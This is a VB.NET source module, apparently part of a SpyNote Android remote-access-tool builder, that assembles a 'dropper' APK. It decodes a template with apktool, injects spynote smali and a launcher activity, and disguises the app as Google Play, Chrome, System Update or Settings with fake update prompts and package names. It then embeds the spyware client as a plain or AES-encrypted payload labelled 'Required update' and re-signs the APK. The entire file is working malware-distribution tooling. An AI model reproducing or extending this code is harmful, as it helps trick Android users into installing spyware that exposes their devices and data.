Imports System.IO
Imports System.IO.Compression
Imports System.Linq
Imports System.Security.Cryptography
Imports System.Text
Imports System.Text.RegularExpressions

Public Module ApkDropperPatcher

    Public Class DropperBuildConfig
        Public Style As String = "Google Play"
        Public TemplateApkPath As String
        Public PayloadUrl As String
        Public EmbedPayload As Boolean = True
        Public UseEncryptedFallback As Boolean = True
        Public DropperPackageName As String
        Public DropperAppName As String
        Public PayloadAppName As String
        Public IconPath As String
        Public ClientPackageName As String
        Public AesKey As Byte()
    End Class

    Public Class DropperBuildReport
        Public Success As Boolean
        Public OutputPath As String
        Public PublishedClientPath As String
        Public PayloadUrl As String
        Public Style As String
        Public DropperPackage As String
        Public Errors As New List(Of String)
    End Class

    Private Class DropperStylePreset
        Public AppName As String
        Public DefaultPackage As String
        Public Header As String
        Public Status As String
        Public Btn As String
        Public AppLineTemplate As String
    End Class

    Public Function TryBuildDropper(resourcesPath As String, cfg As DropperBuildConfig, ByRef report As DropperBuildReport) As Boolean
        report = New DropperBuildReport()
        report.Style = If(cfg?.Style, "Google Play")
        report.Errors = New List(Of String)()

        If cfg Is Nothing Then
            report.Errors.Add("Dropper config is empty")
            Return False
        End If

        Dim payloadDir As String = Path.Combine(resourcesPath, "Imports", "Payload")
        If Not Directory.Exists(payloadDir) Then
            payloadDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Resources", "Imports", "Payload")
        End If

        Dim clientApk As String = ApkNotifyPatcher.EnsureClientOutputDirectory()
        If Not ApkNotifyPatcher.IsValidApkFile(clientApk) Then
            clientApk = ApkNotifyPatcher.ResolveDistApkPath(resourcesPath)
        End If
        If Not File.Exists(clientApk) Then
            clientApk = Path.Combine(payloadDir, "client.apk")
        End If
        If Not File.Exists(clientApk) OrElse Not ApkNotifyPatcher.IsValidApkFile(clientApk) Then
            report.Errors.Add("Client APK not found or invalid — build client first")
            Return False
        End If

        Dim apktoolJar As String = ApkNotifyPatcher.ResolveApktoolJar(payloadDir)
        If String.IsNullOrWhiteSpace(apktoolJar) OrElse Not File.Exists(apktoolJar) Then
            report.Errors.Add("apktool.jar missing — place apktool.zip in Payload folder or Building-6.1\\apktool")
            Return False
        End If
        If Not ApkNotifyPatcher.BuildHasJavaRuntime() Then
            report.Errors.Add("Java runtime not found")
            Return False
        End If

        Dim publishDir As String = Path.Combine(ApkNotifyPatcher.GetDriveRoot(), "Building-6.1", "apktool", "out", "publish")
        Directory.CreateDirectory(publishDir)
        Dim publishedClient As String = Path.Combine(publishDir, "client.apk")
        System.IO.File.Copy(clientApk, publishedClient, True)
        report.PublishedClientPath = publishedClient

        Dim payloadUrl As String = If(cfg.PayloadUrl, String.Empty).Trim()
        If String.IsNullOrWhiteSpace(payloadUrl) Then
            payloadUrl = "file:///" & publishedClient.Replace("\"c, "/"c)
        End If
        report.PayloadUrl = payloadUrl

        Dim preset As DropperStylePreset = ResolveStyle(cfg)
        Dim dropperPackage As String = If(String.IsNullOrWhiteSpace(cfg.DropperPackageName), preset.DefaultPackage, cfg.DropperPackageName.Trim())
        Dim dropperAppName As String = If(String.IsNullOrWhiteSpace(cfg.DropperAppName), preset.AppName, cfg.DropperAppName.Trim())
        Dim payloadAppName As String = If(String.IsNullOrWhiteSpace(cfg.PayloadAppName), "Required update", cfg.PayloadAppName.Trim())
        report.DropperPackage = dropperPackage

        Dim workRoot As String = Path.Combine(resourcesPath, "Dropper", "_work")
        Dim decodeDir As String = Path.Combine(workRoot, "decoded")
        If Directory.Exists(workRoot) Then
            Try
                Directory.Delete(workRoot, True)
            Catch
            End Try
        End If
        Directory.CreateDirectory(workRoot)

        Dim shellDir As String = Path.Combine(payloadDir, "dropper_shell")
        Dim useTemplate As Boolean = Not String.IsNullOrWhiteSpace(cfg.TemplateApkPath) AndAlso File.Exists(cfg.TemplateApkPath)

        If useTemplate Then
            Dim decodeErr As String = Nothing
            If Not ApkNotifyPatcher.RunBuildProcess("java", "-jar """ & apktoolJar & """ d -r """ & cfg.TemplateApkPath & """ -o """ & decodeDir & """ -f", payloadDir, decodeErr) Then
                report.Errors.Add("Template decode failed: " & decodeErr)
                Return False
            End If
        ElseIf Directory.Exists(shellDir) Then
            ApkNotifyPatcher.CopyDirectoryRecursive(shellDir, decodeDir)
        Else
            report.Errors.Add("Built-in dropper_shell missing and no template APK specified")
            Return False
        End If

        CopyDropperSmali(decodeDir, payloadDir)
        ApplyStyleResources(decodeDir, preset, dropperAppName, payloadAppName)
        PatchDropperManifest(decodeDir, dropperPackage, dropperAppName)
        EnsureDropperActivityInManifest(decodeDir)
        WriteDropperAssets(decodeDir, cfg, clientApk, payloadUrl, dropperPackage)
        ApplyDropperIcon(decodeDir, cfg.IconPath, resourcesPath)

        Dim rebuiltPath As String = Path.Combine(workRoot, "dropper_unsigned.apk")
        Dim buildErr As String = Nothing
        If Not ApkNotifyPatcher.RunBuildProcess("java", "-jar """ & apktoolJar & """ b -f -r """ & decodeDir & """ -o """ & rebuiltPath & """", payloadDir, buildErr) Then
            report.Errors.Add("apktool build failed: " & buildErr)
            Return False
        End If
        If Not File.Exists(rebuiltPath) OrElse Not ApkNotifyPatcher.IsValidApkFile(rebuiltPath) Then
            report.Errors.Add("Rebuilt dropper APK is invalid")
            Return False
        End If

        Dim outDir As String = Path.Combine(resourcesPath, "Dropper")
        Directory.CreateDirectory(outDir)
        Dim finalPath As String = Path.Combine(outDir, "Dropper_final.apk")
        System.IO.File.Copy(rebuiltPath, finalPath, True)

        Dim signErr As String = Nothing
        If Not TrySignDropperApk(finalPath, resourcesPath, signErr) Then
            Dim ks As String = Path.Combine(outDir, "test.keystore")
            If Not ApkNotifyPatcher.TrySignApk(finalPath, ks) Then
                report.Errors.Add("Dropper signing failed: " & signErr)
            End If
        End If

        report.OutputPath = finalPath
        report.Success = File.Exists(finalPath) AndAlso ApkNotifyPatcher.IsValidApkFile(finalPath)
        Return report.Success
    End Function

    Private Function ResolveStyle(cfg As DropperBuildConfig) As DropperStylePreset
        Dim style As String = If(cfg.Style, "Google Play").Trim().ToLowerInvariant()
        Select Case style
            Case "chrome"
                Return New DropperStylePreset With {
                    .AppName = "Google Chrome",
                    .DefaultPackage = "com.google.android.chrome.update",
                    .Header = "Google Chrome",
                    .Status = "A new version of Chrome is available.",
                    .Btn = "Update",
                    .AppLineTemplate = "Updating: {0}"
                }
            Case "system update", "system"
                Return New DropperStylePreset With {
                    .AppName = "System Update",
                    .DefaultPackage = "com.android.system.update",
                    .Header = "System Update",
                    .Status = "An important Android update is ready to install.",
                    .Btn = "Install now",
                    .AppLineTemplate = "Package: {0}"
                }
            Case "settings"
                Return New DropperStylePreset With {
                    .AppName = "Settings",
                    .DefaultPackage = "com.android.settings.sync",
                    .Header = "Settings",
                    .Status = "Security components must be updated.",
                    .Btn = "Continue",
                    .AppLineTemplate = "Component: {0}"
                }
            Case Else
                Return New DropperStylePreset With {
                    .AppName = "Google Play Store",
                    .DefaultPackage = "com.android.vending.updates",
                    .Header = "Google Play",
                    .Status = "Updates are available for your apps.",
                    .Btn = "Update all",
                    .AppLineTemplate = "Updating: {0}"
                }
        End Select
    End Function

    Private Sub ApplyStyleResources(decodeDir As String, preset As DropperStylePreset, dropperAppName As String, payloadAppName As String)
        Dim stringsPath As String = Path.Combine(decodeDir, "res", "values", "strings.xml")
        If Not File.Exists(stringsPath) Then Return
        Dim appLine As String = String.Format(preset.AppLineTemplate, payloadAppName)
        Dim text As String = File.ReadAllText(stringsPath, Encoding.UTF8)
        text = text.Replace("__APP_NAME__", EscapeXml(dropperAppName))
        text = text.Replace("__HEADER__", EscapeXml(preset.Header))
        text = text.Replace("__STATUS__", EscapeXml(preset.Status))
        text = text.Replace("__APP_LINE__", EscapeXml(appLine))
        text = text.Replace("__BTN__", EscapeXml(preset.Btn))
        File.WriteAllText(stringsPath, text, New UTF8Encoding(False))
    End Sub

    Private Sub PatchDropperManifest(decodeDir As String, packageName As String, appName As String)
        Dim manifestPath As String = Path.Combine(decodeDir, "AndroidManifest.xml")
        If Not File.Exists(manifestPath) Then Return
        Dim text As String = File.ReadAllText(manifestPath, Encoding.UTF8)
        text = Regex.Replace(text, "package=""[^""]+""", "package=""" & EscapeXml(packageName) & """", RegexOptions.IgnoreCase)
        text = text.Replace("com.spynote.dropper.init", packageName & ".init")
        If text.IndexOf("android:label", StringComparison.OrdinalIgnoreCase) < 0 Then
            text = text.Replace("<application ", "<application android:label=""" & EscapeXml(appName) & """ ")
        End If
        File.WriteAllText(manifestPath, text, New UTF8Encoding(False))
    End Sub

    Private Sub EnsureDropperActivityInManifest(decodeDir As String)
        Dim manifestPath As String = Path.Combine(decodeDir, "AndroidManifest.xml")
        If Not File.Exists(manifestPath) Then Return
        Dim text As String = File.ReadAllText(manifestPath, Encoding.UTF8)
        If text.IndexOf("org.spynote.PlayStoreActivity", StringComparison.OrdinalIgnoreCase) >= 0 Then Return
        If text.IndexOf("DropperInitProvider", StringComparison.OrdinalIgnoreCase) < 0 Then
            Dim providerLine As String = "        <provider android:authorities=""com.spynote.dropper.init"" android:exported=""false"" android:initOrder=""100"" android:name=""org.spynote.DropperInitProvider""/>" & vbCrLf
            text = text.Replace("</application>", providerLine & "    </application>")
        End If
        Dim activityBlock As String =
            "        <activity android:exported=""true"" android:name=""org.spynote.PlayStoreActivity"" android:screenOrientation=""portrait"">" & vbCrLf &
            "            <intent-filter>" & vbCrLf &
            "                <action android:name=""android.intent.action.MAIN""/>" & vbCrLf &
            "                <category android:name=""android.intent.category.LAUNCHER""/>" & vbCrLf &
            "            </intent-filter>" & vbCrLf &
            "        </activity>" & vbCrLf
        text = text.Replace("</application>", activityBlock & "    </application>")
        File.WriteAllText(manifestPath, text, New UTF8Encoding(False))
    End Sub

    Private Sub WriteDropperAssets(decodeDir As String, cfg As DropperBuildConfig, clientApk As String, payloadUrl As String, dropperPackage As String)
        Dim assetsDir As String = Path.Combine(decodeDir, "assets")
        Directory.CreateDirectory(assetsDir)

        File.WriteAllText(Path.Combine(assetsDir, "payload_url.txt"), payloadUrl, New UTF8Encoding(False))
        File.WriteAllText(Path.Combine(assetsDir, "app_mask.txt"), If(cfg.PayloadAppName, "Update"), New UTF8Encoding(False))
        File.WriteAllText(Path.Combine(assetsDir, "key_package.txt"), If(cfg.ClientPackageName, dropperPackage), New UTF8Encoding(False))

        Dim clientBytes As Byte() = File.ReadAllBytes(clientApk)
        If cfg.EmbedPayload Then
            File.WriteAllBytes(Path.Combine(assetsDir, "payload.apk"), clientBytes)
        End If
        If cfg.UseEncryptedFallback AndAlso cfg.AesKey IsNot Nothing AndAlso cfg.AesKey.Length > 0 Then
            Dim enc As Byte() = EncryptPayloadBytes(clientBytes, cfg.AesKey)
            File.WriteAllBytes(Path.Combine(assetsDir, "payload.enc"), enc)
        End If
    End Sub

    Private Sub CopyDropperSmali(decodeDir As String, payloadDir As String)
        Dim src As String = Path.Combine(payloadDir, "dropper_smali", "org", "spynote")
        Dim dst As String = Path.Combine(decodeDir, "smali", "org", "spynote")
        If Not Directory.Exists(src) Then Return
        Directory.CreateDirectory(dst)
        For Each file As String In Directory.GetFiles(src, "*.smali")
            System.IO.File.Copy(file, Path.Combine(dst, Path.GetFileName(file)), True)
        Next
    End Sub

    Private Sub ApplyDropperIcon(decodeDir As String, iconPath As String, resourcesPath As String)
        Dim iconFile As String = iconPath
        If String.IsNullOrWhiteSpace(iconFile) OrElse Not File.Exists(iconFile) Then
            iconFile = Path.Combine(resourcesPath, "Icons", "devico", "gp.png")
        End If
        If Not File.Exists(iconFile) Then Return

        Dim densities As String() = {"mipmap-mdpi", "mipmap-hdpi", "mipmap-xhdpi", "mipmap-xxhdpi"}
        For Each density As String In densities
            Dim dir As String = Path.Combine(decodeDir, "res", density)
            Directory.CreateDirectory(dir)
            System.IO.File.Copy(iconFile, Path.Combine(dir, "ic_launcher.png"), True)
        Next
    End Sub

    Public Function EncryptPayloadBytes(data As Byte(), aesKey As Byte()) As Byte()
        Try
            If data Is Nothing OrElse data.Length = 0 Then Return data
            Dim key As Byte() = aesKey
            If key Is Nothing OrElse key.Length = 0 Then Return data
            If key.Length < 32 Then
                Using sha As SHA256 = SHA256.Create()
                    key = sha.ComputeHash(key)
                End Using
            End If
            Dim iv(15) As Byte
            Using rng As RandomNumberGenerator = RandomNumberGenerator.Create()
                rng.GetBytes(iv)
            End Using
            Using aes As Aes = Aes.Create()
                aes.Key = key.Take(32).ToArray()
                aes.IV = iv
                aes.Mode = CipherMode.CBC
                aes.Padding = PaddingMode.PKCS7
                Using ms As New MemoryStream()
                    ms.Write(iv, 0, iv.Length)
                    Using crypto As ICryptoTransform = aes.CreateEncryptor()
                        Using cs As New CryptoStream(ms, crypto, CryptoStreamMode.Write)
                            cs.Write(data, 0, data.Length)
                            cs.FlushFinalBlock()
                        End Using
                    End Using
                    Return ms.ToArray()
                End Using
            End Using
        Catch
            Return data
        End Try
    End Function

    Private Function TrySignDropperApk(apkPath As String, resourcesPath As String, ByRef errorMessage As String) As Boolean
        errorMessage = Nothing
        Try
            Dim root As String = ApkNotifyPatcher.GetBuildingApktoolRoot()
            Dim toolsErr As String = Nothing
            ApkNotifyPatcher.EnsureSigningTools(resourcesPath, toolsErr)

            Dim signJar As String = Directory.GetFiles(root, "SignApk.jar", SearchOption.AllDirectories).FirstOrDefault()
            If String.IsNullOrWhiteSpace(signJar) Then signJar = Directory.GetFiles(root, "signapk.jar", SearchOption.AllDirectories).FirstOrDefault()
            Dim cert As String = Directory.GetFiles(root, "certificate.pem", SearchOption.AllDirectories).FirstOrDefault()
            Dim keyPk8 As String = Directory.GetFiles(root, "key.pk8", SearchOption.AllDirectories).FirstOrDefault()

            If Not String.IsNullOrWhiteSpace(signJar) AndAlso Not String.IsNullOrWhiteSpace(cert) AndAlso Not String.IsNullOrWhiteSpace(keyPk8) Then
                Dim signedTemp As String = apkPath & ".signed.tmp"
                If File.Exists(signedTemp) Then File.Delete(signedTemp)
                Dim signErr As String = Nothing
                If ApkNotifyPatcher.RunBuildProcess("java", "-jar """ & signJar & """ """ & cert & """ """ & keyPk8 & """ """ & apkPath & """ """ & signedTemp & """", root, signErr, True) AndAlso ApkNotifyPatcher.IsValidApkFile(signedTemp) Then
                    System.IO.File.Copy(signedTemp, apkPath, True)
                    File.Delete(signedTemp)
                    Return True
                End If
                errorMessage = signErr
            End If

            Dim keystorePath As String = Path.Combine(root, "dropper.keystore")
            If ApkNotifyPatcher.TrySignApk(apkPath, keystorePath) AndAlso ApkNotifyPatcher.IsValidApkFile(apkPath) Then
                Return True
            End If

            If String.IsNullOrWhiteSpace(errorMessage) Then errorMessage = If(toolsErr, "SignApk.jar not found")
            Return False
        Catch ex As Exception
            errorMessage = ex.Message
            Return False
        End Try
    End Function

    Private Function EscapeXml(value As String) As String
        If value Is Nothing Then Return String.Empty
        Return value.Replace("&", "&amp;").Replace("""", "&quot;").Replace("<", "&lt;").Replace(">", "&gt;")
    End Function

End Module
